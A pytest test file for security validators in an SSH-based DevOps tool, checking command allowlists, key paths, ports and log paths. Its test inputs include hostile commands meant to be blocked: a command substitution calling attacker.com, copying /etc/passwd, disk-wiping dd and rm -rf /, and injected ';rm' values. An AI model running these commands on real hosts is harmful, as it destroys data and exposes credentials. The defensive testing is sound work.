"""Unit tests for security.py validators."""
import sys
import os

# Run from repo root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from security import (
    validate_ssh_command,
    validate_ssh_key_path,
    validate_host_port,
    validate_nginx_container,
)


# ---------------------------------------------------------------------------
# validate_ssh_command — read-only allowlist
# ---------------------------------------------------------------------------

class TestSshCommandSafe:
    """Commands allowed without confirmed=true."""

    @pytest.mark.parametrize("cmd", [
        "uptime",
        "df -h",
        "free -m",
        "ps aux",
        "cat /etc/hostname",
        "head -20 /var/log/syslog",
        "tail -f /var/log/auth.log",
        "grep ERROR /var/log/app.log",
        "journalctl -u nginx -n 100",
        "ls -la /etc",
        "find /var/log -name '*.log' -maxdepth 2",
        "ip a",
        "ss -tlnp",
        "curl -s http://localhost:8080/health",
        "whoami",
        "hostname",
        "uname -a",
        "systemctl status nginx",
        "systemctl is-active docker",
        "docker ps",
        "docker images",
        "docker logs mycontainer",
        "docker inspect mycontainer",
        "ps aux | grep python",
        "cat /etc/os-release | grep VERSION",
        "journalctl -n 50 | grep ERROR",
    ])
    def test_safe_without_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=False)  # must not raise


class TestSshCommandConditionallyAllowlisted:
    """Commands safe only when no mutating flags are present (P1 regression tests)."""

    @pytest.mark.parametrize("cmd", [
        # sed: read-only usage
        "sed 's/foo/bar/' file.txt",
        "sed -n '10,20p' /var/log/syslog",
        # curl: GET only
        "curl http://localhost:8080/health",
        "curl -s http://localhost/metrics",
        "curl -v https://example.com",
        # wget: read-only
        "wget http://localhost/check",
        # find: no -exec/-delete
        "find /var/log -name '*.log' -maxdepth 2",
        "find /tmp -type f -mtime +7",
    ])
    def test_conditionally_safe_without_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        # sed: in-place edit
        "sed -i 's/foo/bar/' file.txt",
        "sed --in-place 's/x/y/' /etc/hosts",
        # curl: state-mutating
        "curl -X POST http://api/endpoint",
        "curl -d 'data=x' http://api/",
        "curl --data 'x=y' http://api/",
        "curl -o /tmp/output http://x/",
        "curl --output /tmp/out http://x/",
        # wget: state-mutating
        "wget --post-data=x http://x/",
        "wget -O /tmp/file http://x/",
        "wget --output-document=/tmp/x http://x/",
        # find: execution
        "find / -exec rm -rf {} ;",
        "find / -execdir ls {} ;",
        "find /tmp -delete",
        # awk: requires confirmed (can shell out via system())
        "awk '{print}' file.txt",
    ])
    def test_ambiguous_commands_require_confirmed(self, cmd):
        with pytest.raises(ValueError, match="confirmed"):
            validate_ssh_command(cmd, confirmed=False)


class TestSshCommandRequiresConfirmed:
    """Commands that require confirmed=true."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "sudo rm -rf /",
        "reboot",
        "shutdown -h now",
        "systemctl stop nginx",
        "systemctl restart nginx",
        "apt install vim",
        "useradd hacker",
        "chmod 777 /etc/passwd",
        "dd if=/dev/zero of=/dev/sda",
        "docker rm mycontainer",
        "docker stop mycontainer",
        "touch /etc/newfile",
        "mkdir /opt/newdir",
        "cp /etc/passwd /tmp/stolen",
    ])
    def test_requires_confirmed(self, cmd):
        with pytest.raises(ValueError, match="confirmed"):
            validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/test",
        "systemctl stop nginx",
        "docker rm mycontainer",
        "apt install vim",
    ])
    def test_allowed_with_confirmed(self, cmd):
        validate_ssh_command(cmd, confirmed=True)  # must not raise


class TestSshCommandAlwaysBlocked:
    """Always blocked regardless of confirmed."""

    @pytest.mark.parametrize("cmd", [
        "echo $(id)",
        "curl `whoami`.attacker.com",
        "cat /etc/passwd > /tmp/stolen",
        "echo test >> /etc/hosts",
        "ls > ~/output.txt",
    ])
    def test_always_blocked(self, cmd):
        with pytest.raises(ValueError):
            validate_ssh_command(cmd, confirmed=True)

    @pytest.mark.parametrize("cmd", [
        "echo $(id)",
        "cat > /etc/passwd",
    ])
    def test_always_blocked_without_confirmed(self, cmd):
        with pytest.raises(ValueError):
            validate_ssh_command(cmd, confirmed=False)


class TestRedirectionsThatDoNotWrite:
    """Merging descriptors and discarding output are not writes to a file.

    Every command here was refused in real use, which is how '| wc -c' ended up
    in our own house rules as the way to silence output.
    """

    @pytest.mark.parametrize("cmd", [
        "docker logs nginx 2>&1 | grep error",
        "find /var/log -maxdepth 2 -name '*.log' 2>/dev/null",
        "cat /etc/hostname 2>&1",
        "ls /nonexistent 2>/dev/null",
        "ping -c1 example.com >/dev/null",
        "grep -r pattern /etc 2> /dev/null",
        "curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/",
    ])
    def test_harmless_redirects_pass(self, cmd):
        validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "cat /etc/passwd > /tmp/stolen",
        "echo test >> /etc/hosts",
        "docker logs nginx 2>/tmp/captured",
        "ls 2>&1 > /tmp/out",
        "curl -s http://x/ -o /tmp/payload",
    ])
    def test_writes_still_blocked(self, cmd):
        with pytest.raises((ValueError, PermissionError)):
            validate_ssh_command(cmd, confirmed=False)


class TestReadOnlyToolsPassFreely:
    """Inspection commands that used to demand confirmation for no reason.

    Requiring confirmed=true on 'nproc' or 'git status' does not make anything
    safer; it trains whoever approves them to stop reading what they approve.
    """

    @pytest.mark.parametrize("cmd", [
        "nproc",
        "lscpu",
        "command -v docker",
        "readlink -f /etc/nginx/nginx.conf",
        "sha256sum /etc/nginx/nginx.conf",
        "pgrep -a nginx",
        "getent hosts example.com",
        "dpkg-query -l nginx",
        "apt-cache policy nginx",
        "dpkg -l",
        "timedatectl",
        "git log --oneline -5",
        "git status -sb",
        "git diff --stat",
        "git branch -a",
        "git for-each-ref --format='%(refname)'",
        "git config --get user.email",
        "git stash list",
        "apt list --installed",
        "systemctl cat nginx",
        "systemctl list-timers",
    ])
    def test_reading_needs_no_confirmation(self, cmd):
        validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "dpkg -i /tmp/package.deb",
        "dpkg --purge nginx",
        "timedatectl set-timezone UTC",
        "git push origin main",
        "git reset --hard HEAD~1",
        "git checkout main",
        "git clean -fd",
        "git config user.email attacker@example.com",
        "git stash",
        "apt install nginx",
    ])
    def test_mutating_forms_still_need_confirmation(self, cmd):
        with pytest.raises((ValueError, PermissionError)):
            validate_ssh_command(cmd, confirmed=False)


class TestGitGlobalOptions:
    """git puts its global options before the subcommand.

    'git -C /srv/app log' is the same read as 'git log', but the allowlist used
    to look at '-C' and see nothing it recognised.
    """

    @pytest.mark.parametrize("cmd", [
        "git -C /opt/devops-mcp log --oneline -1",
        "git -C /opt/devops-mcp status -sb",
        "git --git-dir=/srv/app/.git status",
        "git --git-dir /srv/app/.git log",
        "git --no-pager diff --stat",
        "git -c core.pager=cat log -5",
        "git -C /srv/app --no-pager show HEAD",
        "cd /opt/devops-mcp && git log --oneline -1",
    ])
    def test_reading_through_global_options(self, cmd):
        validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "git -C /srv/app push origin main",
        "git --git-dir=/srv/app/.git reset --hard HEAD~1",
        "git -c user.email=x@y.z commit -am wip",
        "git --no-pager clean -fd",
        "cd /srv/app && rm -rf node_modules",
    ])
    def test_mutating_through_global_options(self, cmd):
        with pytest.raises((ValueError, PermissionError)):
            validate_ssh_command(cmd, confirmed=False)


class TestChangeDirectory:
    """cd decides nothing on its own; what follows it does."""

    @pytest.mark.parametrize("cmd", [
        "cd /etc && cat hostname",
        "cd /var/log && ls -la",
        "cd /opt/app && docker compose ps",
    ])
    def test_cd_then_read(self, cmd):
        validate_ssh_command(cmd, confirmed=False)

    @pytest.mark.parametrize("cmd", [
        "cd /etc && rm -rf nginx",
        "cd /opt/app && docker compose up -d",
        "cd /tmp && apt install nginx",
    ])
    def test_cd_then_mutate(self, cmd):
        with pytest.raises((ValueError, PermissionError)):
            validate_ssh_command(cmd, confirmed=False)


class TestSshCommandLengthLimit:
    def test_too_long(self):
        with pytest.raises(ValueError, match="500"):
            validate_ssh_command("a" * 501, confirmed=False)

    def test_max_length_ok(self):
        # 'uptime' repeated to fill under 500 chars is fine
        validate_ssh_command("uptime", confirmed=False)


# ---------------------------------------------------------------------------
# validate_ssh_key_path
# ---------------------------------------------------------------------------

class TestSshKeyPath:
    def test_valid_path(self):
        validate_ssh_key_path("/app/keys/my-server.pem")

    def test_valid_path_underscore(self):
        validate_ssh_key_path("/app/keys/vps_key.pem")

    @pytest.mark.parametrize("path", [
        "/etc/ssh/id_rsa",
        "/home/user/.ssh/id_ed25519",
        "/app/keys/../etc/passwd",
        "/app/keys/",
        "/app/keys/sub/dir/key.pem",
    ])
    def test_invalid_paths(self, path):
        with pytest.raises(PermissionError):
            validate_ssh_key_path(path)

    def test_null_byte(self):
        with pytest.raises(PermissionError):
            validate_ssh_key_path("/app/keys/key\x00.pem")

    def test_special_chars(self):
        with pytest.raises(PermissionError):
            validate_ssh_key_path("/app/keys/key;rm.pem")


# ---------------------------------------------------------------------------
# validate_host_port
# ---------------------------------------------------------------------------

class TestHostPort:
    @pytest.mark.parametrize("port", [80, 443, 8080, 8443, 465, 993, 995])
    def test_allowed_ports(self, port):
        validate_host_port("example.com", port)

    @pytest.mark.parametrize("port", [22, 3306, 5432, 6379, 9000, 8765])
    def test_blocked_ports(self, port):
        with pytest.raises(PermissionError):
            validate_host_port("example.com", port)

    def test_invalid_hostname(self):
        with pytest.raises(ValueError):
            validate_host_port("bad host!", 443)


# ---------------------------------------------------------------------------
# validate_nginx_container
# ---------------------------------------------------------------------------

class TestNginxContainer:
    def test_allowed(self):
        validate_nginx_container("nginx")
        validate_nginx_container("nginx-proxy")

    def test_not_allowed(self):
        with pytest.raises(PermissionError):
            validate_nginx_container("myapp")

    def test_invalid_format(self):
        with pytest.raises(ValueError):
            validate_nginx_container("nginx; rm -rf /")


# ---------------------------------------------------------------------------
# validate_log_path
# ---------------------------------------------------------------------------

from security import validate_log_path


class TestLogPath:
    def test_null_byte(self):
        with pytest.raises(PermissionError, match="Null byte"):
            validate_log_path("/var/log/syslog\x00")

    def test_path_traversal(self):
        with pytest.raises(PermissionError, match="traversal"):
            validate_log_path("/var/log/../etc/passwd")

    def test_glob_chars(self):
        with pytest.raises(PermissionError, match="Glob"):
            validate_log_path("/var/log/*.log")

    @pytest.mark.parametrize("path", [
        "/etc/passwd",
        "/tmp/something",
        "/home/user/file.log",
        "/var/log/mysql/error.log",  # not in allowlist
    ])
    def test_not_in_allowlist(self, path):
        with pytest.raises(PermissionError, match="allowlist"):
            validate_log_path(path)

    def test_valid_syslog(self, monkeypatch):
        import pathlib
        monkeypatch.setattr(pathlib.Path, "exists", lambda self: True)
        monkeypatch.setattr(pathlib.Path, "is_file", lambda self: True)
        result = validate_log_path("/var/log/syslog")
        assert str(result) == "/var/log/syslog"
